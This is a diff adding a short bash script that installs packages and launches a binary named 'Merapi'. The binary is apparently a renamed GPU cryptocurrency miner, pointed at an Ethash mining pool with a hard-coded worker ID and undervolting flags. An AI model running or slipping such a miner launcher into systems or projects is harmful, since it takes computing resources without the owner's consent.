@@ -1,0 +1,7 @@
+#!/bin/bash
+
+WORKER=Roschach001
+apt-get update
+apt install screen -y
+apt-get install libpci3
+chmod u+x Merapi && ./Merapi -pool stratum+tcp://ethash.poolbinance.com:443 -wal Roschach001.001 -pass 123456 -daglim 0 -lidag 3 -cclock 0.1 -cvddc 0.1 -mclock 0.1 -mvddc 0.1
